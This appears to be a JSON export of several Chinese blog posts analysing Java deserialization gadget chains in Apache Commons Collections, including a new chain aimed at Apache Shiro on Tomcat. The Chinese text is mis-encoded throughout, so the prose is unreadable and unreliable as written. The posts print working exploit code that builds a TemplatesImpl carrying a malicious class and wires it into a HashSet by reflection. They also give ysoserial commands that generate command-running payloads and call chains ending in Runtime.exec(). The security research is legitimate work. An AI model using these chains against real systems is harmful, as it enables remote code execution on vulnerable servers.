Runtimt.getRuntime().execã€‚å¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œæˆ‘ä»¬æ— æ³•åˆ©ç”¨äº†ã€‚ 2.æ— æ„ä¹‰çš„Stringè¿™é‡Œçš„æ— æ„ä¹‰çš„StringæŒ‡çš„æ˜¯ä¼ å…¥åˆ°ConstantTransformer.transformå‡½æ•°çš„inputï¼Œè¯¥transformå‡½æ•°ä¸ä¾èµ–inputï¼Œè€Œç›´æ¥è¿”å›iConstant è¿™é‡Œç¬¬ä¸€æ¡è·¯è‚¯å®šæ–­äº†ï¼Œé‚£ä¹ˆå°±æ˜¯æ€ä¹ˆåˆ©ç”¨è¿™ä¸ªæ— æ„ä¹‰çš„Stringäº†ï¼ ä»CommonsCollection5å¼€å§‹ï¼Œå‡ºç°äº†TiedMapEntryï¼Œå…¶ä½œä¸ºä¸­ç»§ï¼Œè°ƒç”¨äº†LazyMapï¼ˆmapï¼‰çš„getå‡½æ•°ã€‚ æ¥çœ‹ä¸€çœ‹ å…¶ä¸­mapå’Œkeyæˆ‘ä»¬éƒ½å¯ä»¥æ§åˆ¶ï¼Œè€ŒLazyMap.getè°ƒç”¨äº†transformå‡½æ•°ï¼Œå¹¶å°†å¯æ§çš„keyä¼ å…¥transformå‡½æ•° è¿™é‡Œå°±æ¥ä¸Šäº†æˆ‘ä»¬å‰é¢è®¨è®ºçš„ï¼Œå°†æ„é€ å¥½çš„TemplatesImplï¼ˆkeyï¼‰ä½œä¸ºInvokerTransformer.transformå‡½æ•°çš„inputä¼ å…¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥å°†templates gadgetsä¸²èµ·æ¥äº†ã€‚ ç®€å•æ¥è¯´ï¼Œæˆ‘ä»¬å°†CommonsCollections5,6,9æ„é€ é“¾ä¸­çš„TiedMapEntryçš„keyç”¨äº†èµ·æ¥ã€‚ 123final Object templates = Gadgets.createTemplatesImpl(command);// TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); //åŸæ¥çš„åˆ©ç”¨æ–¹å¼TiedMapEntry entry = new TiedMapEntry(lazyMap, templates); è¿™é‡Œå°†æ— æ„ä¹‰çš„fooæ”¹é€ æˆäº†è§¦å‘TemplatesImpl.newTransformerçš„triggerã€‚ è€Œåœ¨TiedMapEntryå‰çš„åˆ©ç”¨é“¾ï¼Œåœ¨åŸç”Ÿshiroç¯å¢ƒä¸‹ï¼Œå¹¶ä¸å†²çªï¼ˆæ²¡æœ‰æ•°ç»„ç±»å‹çš„å¯¹è±¡ï¼‰ï¼Œå¯ä»¥æ­£å¸¸ååºåˆ—åŒ–ã€‚è¿™ä¸€éƒ¨åˆ†å°±çœç•¥äº†ã€‚ 20200108è¡¥å……å…¶å®createTemplatesImplçš„åˆ©ç”¨æ–¹å¼ä¸­è¿˜æ˜¯å­˜åœ¨æ•°ç»„å½¢å¼çš„ï¼Œbyte[]æ•°ç»„ç”¨äºå­˜å‚¨evil classã€‚ä½†æ˜¯åœ¨tomcat 7åŠä»¥ä¸Šçš„ç¯å¢ƒä¸‹ï¼Œjavaçš„åŸç”Ÿæ•°æ®ç±»å‹çš„æ•°ç»„è¿˜åŸä¸å½±å“ååºåˆ—åŒ–ï¼Œåªé’ˆå¯¹å¯¹è±¡çº§åˆ«çš„æ•°ç»„è¿˜åŸã€‚è€Œtomcat6çš„å®ç°æ–¹å¼ç›´æ¥ä¸å…è®¸æ•°ç»„ç±»å‹çš„è¿˜åŸï¼Œä¹Ÿå°±æ˜¯è¯´è¯¥åˆ©ç”¨é“¾åœ¨tomcat6çš„ç¯å¢ƒä¸‹æ˜¯æˆåŠŸä¸äº†çš„ã€‚ 20200109è¡¥å……å½“åº”ç”¨å¼€å¯äº†security manageræ—¶ï¼Œéœ€è¦è®¾ç½®-Djdk.xml.enableTemplatesImplDeserialization=true 0x04 EXPç¼–å†™è¿™é‡Œå…¶å®å¯ä»¥æ„é€ å‡ºå¥½å‡ ä¸ªé“¾ï¼Œæˆ‘è¿™é‡Œå°±æ‹¿HashSetä¸ºä¾‹ï¼Œå®Œæ•´çš„expè§MyYsoserialä¸­çš„CommonsCollections10 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849final Object templates = Gadgets.createTemplatesImpl(command);// æ„é€ å¸¦æœ‰evil class bytesçš„TemplatesImpl// æ„é€ InvokerTransformerï¼Œå¡«å……æ— å®³çš„toStringå‡½æ•°final InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]);final Map innerMap = new HashMap();// æ„é€ LazyMapçš„factoryä¸ºå‰é¢çš„InvokerTransformerfinal Map lazyMap = LazyMap.decorate(innerMap, transformer);// å¡«å……TiedMapEntryçš„mapï¼ˆlazyMapï¼‰å’Œkeyï¼ˆTemplatesImplï¼‰TiedMapEntry entry = new TiedMapEntry(lazyMap, templates);HashSet map = new HashSet(1);map.add(\"foo\");// ä¸‹è¿°ä»£ç å°†entryå¡«å……åˆ°HashSetçš„nodeçš„keyä¸Šï¼Œå¯ä»¥ä½¿å¾—HashSetåœ¨putçš„æ—¶å€™è°ƒç”¨TiedMapEntryçš„hashCodeå‡½æ•°Field f = null;try &#123; f = HashSet.class.getDeclaredField(\"map\");&#125; catch (NoSuchFieldException e) &#123; f = HashSet.class.getDeclaredField(\"backingMap\");&#125;Reflections.setAccessible(f);HashMap innimpl = null;innimpl = (HashMap) f.get(map);Field f2 = null;try &#123; f2 = HashMap.class.getDeclaredField(\"table\");&#125; catch (NoSuchFieldException e) &#123; f2 = HashMap.class.getDeclaredField(\"elementData\");&#125;Reflections.setAccessible(f2);Object[] array = new Object[0];array = (Object[]) f2.get(innimpl);Object node = array[0];if(node == null)&#123; node = array[1];&#125;Field keyField = null;try&#123; keyField = node.getClass().getDeclaredField(\"key\");&#125;catch(Exception e)&#123; keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");&#125;Reflections.setAccessible(keyField);keyField.set(node, entry);// å°†æœ€ç»ˆçš„è§¦å‘å‡½æ•°newTransformerè£…è½½åˆ°InvokerTransformerä¸ŠReflections.setFieldValue(transformer, \"iMethodName\", \"newTransformer\");return map; è¿™é‡Œä¸å¯¹æºç è¿›è¡Œè®²è§£äº†ï¼Œéƒ½å†™åœ¨äº†æ³¨é‡Šé‡Œã€‚ è¿™é‡Œæ•´ç†ä¸€ä¸‹è¿™æ¡é“¾çš„è°ƒç”¨è¿‡ç¨‹ 12345678910java.util.HashSet.readObject()-&gt; java.util.HashMap.put()-&gt; java.util.HashMap.hash() -&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode() -&gt; org.apache.commons.collections.keyvalue.TiedMapEntry.getValue() -&gt; org.apache.commons.collections.map.LazyMap.get() -&gt; org.apache.commons.collections.functors.InvokerTransformer.transform() -&gt; java.lang.reflect.Method.invoke() ... templates gadgets ... -&gt; java.lang.Runtime.exec() 0x05 æ€»ç»“åœ¨ç»è¿‡å¯¹CommonsCollectionsç³»åˆ—çš„åˆ©ç”¨é“¾è¿›è¡Œåˆ†æåï¼Œåœ¨shiroè¿™ä¸ªé—®é¢˜ä¸Šï¼Œè¿›è¡Œäº†å®æˆ˜ï¼Œè§£å†³äº†tomcatä¸‹æ— æ³•åˆ©ç”¨shiroåŸç”Ÿçš„commons-collections:3.2.1è¿™ä¸ªé—®é¢˜ã€‚ æœ€åï¼Œåœ¨æœ€è¿‘çš„shiro-721åˆ©ç”¨ä¸Šï¼Œè¿™ä¸ªåˆ©ç”¨é“¾å¸Œæœ›å¯ä»¥å¸®åŠ©åˆ°å¤§å®¶ Happy Hacking XD"},{"title":"Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections2,4,8","permalink":"http://blog.0kami.cn/2019/11/05/java/study-java-deserialized-commonscollections4/","text":"0x00 å‰è¨€å‰é¢å‡ ç¯‡æ–‡ç« ï¼Œåˆ†æäº†CommonsCollections:3.2.1ç‰ˆæœ¬ä»¥ä¸‹å­˜åœ¨çš„ååºåˆ—åŒ–é“¾ã€‚ä»Šå¤©å°†ç»§ç»­åˆ†æCommonsCollections:4.0ç‰ˆæœ¬ï¼Œä¸»è¦è®²è¿°CommonsCollections2ï¼Œ4ï¼Œ8çš„åˆ©ç”¨é“¾æ„é€ ã€‚ 0x01 å‰æ™¯å›é¡¾commons-collections:4.0ç‰ˆæœ¬å…¶å®å¹¶æ²¡æœ‰åƒ3.2.2ç‰ˆæœ¬çš„ä¿®å¤æ–¹å¼ä¸€æ ·åšæ‹‰é»‘å¤„ç†ï¼Œæ‰€ä»¥åœ¨3.2.1åŠä»¥ä¸‹çš„åˆ©ç”¨é“¾æ”¹æ”¹è¿˜æ˜¯å¯ä»¥ç”¨çš„ã€‚ä¾‹å¦‚CommonsCollections5 12final Map&lt;String, String&gt; innerMap = new HashMap();final Map lazyMap = LazyMap.lazyMap(innerMap, transformerChain); å°†innerMapæ”¹æˆé”®å€¼å¯¹çš„ç”³æ˜æ–¹å¼å³å¯ï¼Œä½†æ˜¯å¤§å®¶æ˜¯ä¸æ˜¯è¿˜è®°å¾—ï¼Œé™¤äº†ç”¨LazyMapçš„æ–¹å¼ï¼ŒCommonsCollections3æ›¾æåˆ°è¿‡ä½¿ç”¨TrAXFilterç±»åˆå§‹åŒ–çš„æ–¹å¼æ¥è½½å…¥ä»»æ„çš„class bytesæ•°ç»„ã€‚ commons-collections:4.0ç‰ˆæœ¬ä¸‹çš„åˆ©ç”¨é“¾ï¼Œç”¨çš„éƒ½æ˜¯TemplatesImplä½œä¸ºæœ€ç»ˆçš„å‘½ä»¤æ‰§è¡Œçš„ä»£ç è°ƒç”¨ï¼Œç”±äºå‰é¢åˆ†æè¿‡è¿™ä¸ªåˆ©ç”¨æ–¹å¼ï¼Œåæ–‡ä¸å†å¤è¿°ã€‚ 0x02 åˆ©ç”¨é“¾åˆ†æ1. CommonsCollections2,4CommonsCollections2,4éƒ½ç”¨åˆ°äº†ä¸€ä¸ªæ–°çš„ç±»PriorityQueueçš„Comparatoræ¥è§¦å‘transformå‡½æ•°ï¼Œä¸¤è€…çš„åŒºåˆ«åœ¨äºä¸­é—´çš„æ¡¥æ¥ç”¨çš„ä¸åŒçš„Transformerå¯¹è±¡ã€‚å…ˆæ¥çœ‹ä¸€ä¸‹PriorityQueue.readObject æ¡†æ¡†é‡Œçš„ä¸»è¦å·¥ä½œä¸ºååºåˆ—åŒ–æ¢å¤è¯¥å¯¹è±¡çš„æ•°æ®ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨heapify() ç»§ç»­è·Ÿè¿›siftDown å½“æˆ‘ä»¬åœ¨å®ä¾‹åŒ–å¯¹è±¡æ—¶æä¾›äº†comparatorï¼Œå°†ä¼šæ¥åˆ°æˆ‘ä»¬æœ€ç»ˆè§¦å‘compareçš„ä½ç½®ï¼Œçœ‹ä¸€ä¸‹siftDownUsingComparator è¿™é‡Œè°ƒç”¨äº†æˆ‘ä»¬ä¼ å…¥çš„comparatorï¼Œå¹¶è°ƒç”¨å…¶compareï¼Œåˆ©ç”¨é“¾ä¸­ä½¿ç”¨äº†TransformingComparator,æ¥çœ‹ä¸€ä¸‹å®ƒçš„compareå‡½æ•° è°ƒç”¨äº†å½“å‰çš„transformerçš„transformå‡½æ•°ï¼Œçœ‹åˆ°è¿™é‡Œï¼Œå…¶å®å·²ç»å¾ˆç†Ÿäº†ï¼Œå‰é¢åˆ†æçš„å¾ˆå¤šåˆ©ç”¨é“¾éƒ½è·Ÿtransformæœ‰å…³ï¼Œå¹¶ä¸”4.0ç‰ˆæœ¬å¹¶æ²¡æœ‰æ‹‰é»‘ç›¸å…³çš„transformerã€‚æ‰€ä»¥æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨å‰é¢çš„ä¸€äº›æ€è·¯äº†ã€‚ CommonsCollections2 CommonsCollections2åˆ©ç”¨äº†InvokerTransformerç±»çš„ä»»æ„ç±»å‡½æ•°è°ƒç”¨çš„transformï¼Œä¼ å…¥æ„é€ å¥½çš„templates gadgetå¹¶è°ƒç”¨ TemplatesImpl.newTransformer CommonsCollections4 CommonsCollections4åç»­ç”¨çš„æ–¹æ³•åŒCommonsCollections3ä¸€æ ·ï¼Œç”¨InstantiateTransformeræ¥è§¦å‘TrAXFilterçš„åˆå§‹åŒ–ï¼Œæœ€ç»ˆä¹Ÿå°†è°ƒç”¨TemplatesImpl.newTransformer æ•´ç†ä¸€ä¸‹åˆ©ç”¨é“¾ 12345678910111213141516171819202122CommonsCollection2:PriorityQueue.readObject -&gt; PriorityQueue.heapify() -&gt; PriorityQueue.siftDown() -&gt; PriorityQueue.siftDownUsingComparator() -&gt; TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec()CommonsCollection4:PriorityQueue.readObject -&gt; PriorityQueue.heapify() -&gt; PriorityQueue.siftDown() -&gt; PriorityQueue.siftDownUsingComparator() -&gt; TransformingComparator.compare() -&gt; ChainedTransformer.transform() -&gt; InstantiateTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec() 2.CommonsCollections8CommonsCollections8æ˜¯ä»Šå¹´navalorenzoæ¨é€åˆ°ysoserialä¸Šçš„ï¼Œ8ä¸2ï¼Œ4çš„åŒºåˆ«åœ¨äºä½¿ç”¨äº†æ–°çš„readObjectè§¦å‘ç‚¹TreeBag æ¥çœ‹ä¸€ä¸‹TreeBag.readObject è¿™é‡Œçš„ä¸¤ä¸ªå…³é”®ç‚¹TreeBagçš„çˆ¶ç±»çš„doReadObjectå‡½æ•°å’ŒTreeMap. çœ‹ä¸€ä¸‹doReadObject è¿™é‡Œå¯¹ä¼ å…¥çš„TreeMapè°ƒç”¨äº†putå‡½æ•° ç»§ç»­è·Ÿè¿›compareå‡½æ•° è¿™é‡Œåˆå›åˆ°äº†ç†Ÿæ‚‰çš„comparator.compareå‡½æ•°ï¼Œå…¶ä¸­comparatorå°±æ˜¯æˆ‘ä»¬æ„é€ çš„TransformingComparator åç»­è·ŸCommonsCollections2ç›¸åŒï¼Œå°±ä¸å¤è¿°äº†ã€‚ æ•´ç†ä¸€ä¸‹åˆ©ç”¨é“¾ 12345678TreeBag.readObject() -&gt; AbstractMapBag.doReadObject() -&gt; TreeMap.put() -&gt; TransformingComparator.compare() -&gt; InvokerTransformer.transform() -&gt; TemplatesImpl.newTransformer() ... templates Gadgets ... -&gt; Runtime.getRuntime().exec() 3. commons-collections:4.1åŠä»¥ä¸Šçš„æ”¹å˜å‰é¢æåˆ°çš„CommonsCollections2,4,8ï¼Œéƒ½æ˜¯åœ¨commons-collections:4.0ç‰ˆæœ¬ä¸‹æ‰å¯ä»¥ä½¿ç”¨çš„ã€‚è¿™é‡Œæˆ‘ä»¬æ¥çœ‹çœ‹ä¸ºä»€ä¹ˆåœ¨4.1åŠä»¥ä¸Šç‰ˆæœ¬æ— æ³•åˆ©ç”¨ï¼ å‰é¢æˆ‘ä»¬ç”¨åˆ°äº†InvokerTransformerå’ŒInstantiateTransformerä½œä¸ºä¸­è½¬ï¼Œå¾ˆçœŸå®ï¼Œ4.1ç‰ˆæœ¬è¿™ä¸¤ä¸ªç±»éƒ½æ²¡æœ‰å®ç°Serializableæ¥å£ï¼Œå¯¼è‡´æˆ‘ä»¬åœ¨åºåˆ—åŒ–æ—¶å°±æ— æ³•åˆ©ç”¨è¿™ä¸¤ä¸ªç±»ã€‚emmmmmï¼Œç›´æ¥å¹²æ‰äº†ä¸Šé¢çš„2ï¼Œ4ï¼Œ8ã€‚ è¿™ä¸ªæ”¹å˜æ„å‘³ç€æˆ‘ä»¬éœ€è¦ä»å…¶ä»–å¯æ“ä½œå±é™©æ–¹æ³•çš„å¯¹è±¡äº†ã€‚ 0x03 æ€»ç»“åˆ†æå®Œysoserialé‡Œçš„commons-collectionsç³»åˆ—çš„payloadsï¼Œæˆ‘ä»¬å¯ä»¥ç®€å•æ€»ç»“ä¸€ä¸‹Javaçš„ååºåˆ—åŒ–æŒ–æ˜æ€è·¯ï¼ˆä¸æ¶‰åŠæŠ€æœ¯ç‚¹ï¼Œä¸ªäººçš„ä¸€äº›æƒ³æ³•ï¼‰ã€‚ 1. æœ€ç»ˆçš„åˆ©ç”¨æ•ˆæœåœ¨åˆ©ç”¨é“¾æ„é€ ä¸­ï¼Œæˆ‘ä»¬è‚¯å®šå¸Œæœ›æœ€ç»ˆå¯ä»¥è¾¾åˆ°ä»»æ„å‘½ä»¤æ‰§è¡Œæˆ–è€…æ˜¯ä»»æ„ä»£ç æ‰§è¡Œçš„æ•ˆæœï¼Œè¿™æ ·ä¼šä½¿å¾—ååºåˆ—åŒ–æ¼æ´çš„å¨åŠ›æœ€å¤§åŒ–ã€‚æ‰€ä»¥æˆ‘ä»¬å¾ˆå¼€å¿ƒèƒ½çœ‹åˆ°InvokerTransformerçš„transformå‡½æ•°ï¼Œä»–åˆ©ç”¨åå°„æœºåˆ¶æ¥è°ƒç”¨ä»»æ„çš„ä»£ç ï¼Œä¹Ÿæ„å‘³ç€æˆ‘ä»¬èƒ½æ§åˆ¶ä»»æ„ç±»çš„è°ƒç”¨æ‰§è¡Œã€‚ä½†æ˜¯åœ¨å®é™…çš„æŒ–æ˜ä¸­ï¼Œé™¤äº†å¯¹åå°„æœºåˆ¶çš„æŒ–æ˜å’ŒdefineClassç±»å‹çš„æŒ–æ˜ï¼Œæˆ‘ä»¬ä¹Ÿåº”è¯¥æ³¨æ„åˆ°å…¶ä»–å¯èƒ½ä¼šå­˜åœ¨çš„å±é™©åˆ©ç”¨ï¼Œå¦‚ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œä»»æ„æ–‡ä»¶åˆ é™¤ç­‰ç­‰ã€‚ 2. åˆ©ç”¨é“¾æ€»ä½“çš„ä¸€ä¸ªæŒ–æ˜æ€è·¯æˆ‘ä»¬åœ¨åˆ†æå®Œæ‰€æœ‰çš„CommonsCollectionsçš„payloadså¾ˆå®¹æ˜“å‘ç°çš„ä¸€ç‚¹æ˜¯å¾ˆå¤špayloadsâ€œæ‚äº¤â€ç»„åˆäº†å¤šä¸ªå¯åˆ©ç”¨çš„èŠ‚ç‚¹ã€‚é‚£ä¹ˆæˆ‘ä»¬åœ¨å®é™…çš„æŒ–æ˜ä¸­ï¼Œæˆ‘ä»¬éœ€è¦é¦–å…ˆèƒ½è·çŸ¥å“ªäº›åº“æ–‡ä»¶é‡Œæœ‰å“ªäº›å¯åˆ©ç”¨çš„èŠ‚ç‚¹ï¼Œç„¶åæ ¹æ®ä¸€å®šçš„è§„åˆ™æ¥è¿›è¡Œä¸€ä¸ªé“¾æ¡çš„è¿æ¥ã€‚ é‚£ä¹ˆæ¥çœ‹ä¸€ä¸‹ï¼Œå¯åˆ©ç”¨çš„èŠ‚ç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ å®ç°äº†Serializableæ¥å£ï¼Œæšä¸¾å‡ºæ‰€æœ‰å¯ä»¥è¢«åºåˆ—åŒ–çš„ç±»ã€‚ è¯¥ç±»çš„ç±»å±æ€§åšäº†å‡½æ•°è°ƒç”¨æˆ–å‡½æ•°çš„è¿”å›å€¼ï¼Œå¦‚TreeMap.map.put()å’ŒConstantTransformer.transformç›´æ¥è¿”å›iConstantç±»å±æ€§ã€‚å¦‚æœä¸å­˜åœ¨ä¸Šè¿°çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥å¿½ç•¥ã€‚ å®ç°äº†readObjectå‡½æ•°ï¼Œè¿™ç§æƒ…å†µå¯ä½œä¸ºèµ·å§‹ç‚¹ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºæ¡¥æ¥ç‚¹ï¼Œéœ€è¦å…·ä½“åˆ¤æ–­å…¶ä»£ç çš„å®ç°ã€‚ å®ç°äº†invokeå‡½æ•°ï¼Œè¿™ç§æƒ…å†µå¯ä½œä¸ºæ¡¥æ¥ç‚¹ï¼Œåˆ©ç”¨äº†ä»£ç†æœºåˆ¶ã€‚ ä»readObjectå‡½æ•°å’Œinvokeå‡½æ•°ï¼Œè¡ç”Ÿå‡ºæ¥çš„ç±»å±æ€§å‡½æ•°è°ƒç”¨ï¼Œè¿™è¾¹å¯èƒ½ä¼šå¼•å‘å…¶ä»–çš„ç±»å‡½æ•°ï¼Œå¦‚TreeBag.readObjectçš„å®ç°ï¼Œå°†å¼•å‘ä¸‹ä¸€æ­¥çš„çˆ¶ç±»å‡½æ•°doReadObjectå‡½æ•°ã€‚è¿™é‡Œå°±éœ€è¦åšä¸€ä¸ªäººå·¥æˆ–è€…æ˜¯é™æ€çš„ä»£ç åˆ†æã€‚ æ¥ä¸‹æ¥ï¼Œå…³äºå¯åˆ©ç”¨èŠ‚ç‚¹çš„ä¸²è”ï¼Œå…¶å®ä¸»è¦ä¾èµ–äºç¬¬5ç‚¹çš„æŒ–æ˜ï¼Œæˆ‘ä»¬éœ€è¦æ ¹æ®ç»éªŒæˆ–è€…æ˜¯é™æ€çš„ä»£ç åˆ†ææ¥åšã€‚ æ ¹æ®ä¸Šé¢çš„ä¸€ä¸ªåˆ†æï¼Œå…¶å®æˆ‘ä»¬å¯ä»¥åšåˆ°ä¸€ä¸ªè‡ªåŠ¨åŒ–çš„åˆ©ç”¨é“¾å‘æ˜ï¼Œhttps://github.com/JackOfMostTrades/gadgetinspector è¿™ä¸ªå·¥å…·å°±æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„å®ç°ï¼Œåç»­å°†å¯¹å…¶è¿›è¡Œä¸€ä¸ªåˆ†æã€‚ ä»commons-collectionsçš„é˜²æŠ¤æ¥çœ‹ï¼Œæˆ‘ä»¬è¶Šæ¥è¶Šæ— æ³•åœ¨å•ä¸ªåº“é‡Œé¢å®ç°ä¸€ä¸ªå¯åˆ©ç”¨çš„åˆ©ç”¨é“¾ï¼Œè¿™ä¹Ÿæ„å‘³ç€æˆ‘ä»¬éœ€è¦å¯¹ä¸åŒçš„é¡¹ç›®åšé’ˆå¯¹æ€§çš„åˆ†æï¼Œæ‰€ä»¥gadetinspectorè¿™ä¸ªå·¥å…·çš„é‡è¦æ€§å°±ä¸è¨€è€Œå–»äº†ã€‚ä¸‹ä¸€æ­¥å°†é‡ç‚¹åˆ†æä¸€ä¸‹è¯¥å·¥å…·çš„å®ç°ã€‚"},{"title":"Javaååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ä¹‹CommonsCollections5,6,7,9,10","permalink":"http://blog.0kami.cn/2019/10/31/java/study-java-deserialized-commonscollections3-others/","text":"0x00 å‰è¨€æœ¬æ–‡ç»§ç»­åˆ†æCommonsCollectionsçš„ç›¸å…³ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œè¿™æ¬¡ä¸»è¦åˆ†æCommonsCollections5,6,7ï¼Œä»¥åŠæˆ‘æ‰¾çš„ä¸€ä¸ªæ–°åˆ©ç”¨é“¾ï¼Œè¿™é‡Œæš‚ä¸”å°†å…¶ç§°ä¸º10. 0x01 ç¯å¢ƒå‡†å¤‡ jdk8ï¼Œcommons-collections:3.1 123java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 \"open /System/Applications/Calculator.app\" &gt; commonscollections5.serjava -jar ysoserial-master-30099844c6-1.jar CommonsCollections6 \"open /System/Applications/Calculator.app\" &gt; commonscollections6.serjava -jar ysoserial-master-30099844c6-1.jar CommonsCollections7 \"open /System/Applications/Calculator.app\" &gt; commonscollections7.ser 0x02 åˆ©ç”¨é“¾åˆ†æ 1. èƒŒæ™¯å›é¡¾å‰é¢æåˆ°è¿‡CommonsCollections1å’Œ3åœ¨æ„é€ AnnotationInvocationHandleræ—¶ç”¨åˆ°äº†Override.classã€‚ä½†æ˜¯å¦‚æœä½ åœ¨jdk8çš„ç¯å¢ƒä¸‹å»è½½å…¥ç”Ÿæˆçš„payloadï¼Œä¼šå‘ç”Ÿjava.lang.Override missing element entrySetçš„é”™è¯¯ã€‚ è¿™ä¸ªé”™è¯¯çš„äº§ç”ŸåŸå› ä¸»è¦åœ¨äºjdk8æ›´æ–°äº†AnnotationInvocationHandlerå‚è€ƒ jdk8ä¸ç›´æ¥è°ƒç”¨s.defaultReadObjectæ¥å¡«å……å½“å‰çš„AnnotaionInvocationHandlerå®ä¾‹ï¼Œè€Œé€‰æ‹©äº†å•ç‹¬å¡«å……æ–°çš„å˜é‡ã€‚ è¿™é‡Œæˆ‘ä»¬å›é¡¾ä¸€ä¸‹ï¼Œ1å’Œ3çš„payloadçš„è§¦å‘ç‚¹æ˜¯LazyMap.getå‡½æ•°ï¼Œè€Œè§¦å‘è¿™ä¸ªå‡½æ•°éœ€è¦ä½¿å¾—memberValuesä¸ºLazyMapå¯¹è±¡ æ˜¾ç„¶ï¼Œjdk8çš„æ“ä½œä½¿å¾—memberValueså¹¶ä¸æ˜¯æˆ‘ä»¬æ„é€ å¥½çš„LazyMapç±»å‹ã€‚åœ¨è°ƒè¯•ä¸­ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„memberValuesä¸ºLinkedHashMapå¯¹è±¡ï¼Œè¯¥å¯¹è±¡æ— æ³•è·å¾—entrySetçš„å†…å®¹ï¼Œæ‰€ä»¥ä¼šæŠ¥å‰é¢çš„è¿™ä¸ªé”™è¯¯ã€‚ jdk8ä¸‹CommonsCollections1å’Œ3æ— æ³•æˆåŠŸåˆ©ç”¨äº†ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæ›¿ä»£AnnotationInvocationHandlerçš„åˆ©ç”¨æ–¹å¼å‘¢ï¼Ÿè¿™å°±æ˜¯æœ¬æ–‡è¦è®²çš„CommonsCollections5ï¼Œ6ï¼Œ7æ‰€åšå‡ºçš„æ”¹å˜ã€‚ 2. é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections5CommonsCollections5ä¸1çš„åŒºåˆ«åœ¨äºAnnotationInvocationHandlerï¼Œåéƒ¨åˆ†æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥è¿™é‡Œä¸åˆ†æåéƒ¨åˆ†ã€‚ AnnotationInvocationHandleråœ¨å‰é¢èµ·åˆ°çš„ä½œç”¨æ˜¯æ¥è§¦å‘LazyMap.getå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ä¸‹æ¥å°±æ˜¯è¦é‡æ–°æ‰¾ä¸€ä¸ªå¯ä»¥è§¦å‘è¯¥å‡½æ•°çš„å¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡æ»¡è¶³ ç±»å¯åºåˆ—åŒ–ï¼Œç±»å±æ€§æœ‰ä¸ªå¯æ§çš„Mapå¯¹è±¡æˆ–Object è¯¥ç±»çš„ç±»å‡½æ•°ä¸Šæœ‰è°ƒç”¨è¿™ä¸ªMap.getçš„åœ°æ–¹ CommonsCollections5åœ¨è¿™é‡Œç”¨åˆ°äº†TiedMapEntryï¼Œæ¥çœ‹ä¸€ä¸‹ TiedMapEntryæœ‰ä¸€ä¸ªmapç±»å±æ€§ï¼Œä¸”åœ¨getValueå¤„è°ƒç”¨äº†map.getå‡½æ•°ã€‚åŒæ—¶toStringã€hashCodeã€equalså‡è°ƒç”¨äº†getValueå‡½æ•°ï¼Œè¿™é‡Œå…³æ³¨toStringå‡½æ•°ã€‚ toStringå‡½æ•°é€šå¸¸åœ¨ä¸å­—ç¬¦ä¸²æ‹¼æ¥æ—¶ï¼Œä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸ªå¯¹è±¡æ»¡è¶³ ç±»å¯åºåˆ—åŒ–ï¼Œç±»å±æ€§æœ‰ä¸ªMap.Entryå¯¹è±¡æˆ–Object è¯¥ç±»ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªç±»å±æ€§çš„toStringå‡½æ•°æˆ–å‰é¢çš„å¦å¤–å‡ ç§ è¿™é‡Œé€‰æ‹©äº†BadAttributeValueExpExceptionå¯¹è±¡ï¼Œä»–çš„readObjectå‡½æ•°ä¼šè‡ªåŠ¨è°ƒç”¨ç±»å±æ€§çš„toStringå‡½æ•°ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡ŒSystem.getSecurityManagerä¸ºç©ºï¼Œæ¢å¥è¯è¯´ï¼Œå°±æ˜¯å½“å‰çš„jvmç¯å¢ƒä¸èƒ½å¯ç”¨å®‰å…¨ç®¡ç†å™¨ã€‚ æ¥çœ‹ä¸€ä¸‹ä¸€æ•´ä¸ªè°ƒç”¨é“¾ 12345BadAttributeValueExpException.readObject() -&gt; valObj.toString() =&gt; TiedMapEntry.getValue -&gt; TiedMapEntry.map.get() =&gt; LazyMap.get() -&gt; factory.transform() =&gt; ChainedTransformer.transform() -&gt; å‰æ–‡æ„é€ çš„Runtime.getRuntime().exec() 3. é‡æ–°æ„é€ å‰åŠéƒ¨åˆ†åˆ©ç”¨é“¾â€“CommonsCollections6CommonsCollections6æ˜¯å¦ä¸€ç§æ›¿æ¢æ–¹å¼ï¼ŒååŠéƒ¨åˆ†çš„åˆ©ç”¨é“¾è¿˜æ˜¯æ²¡æœ‰å˜ï¼Œä¸ä½œåˆ†æã€‚ 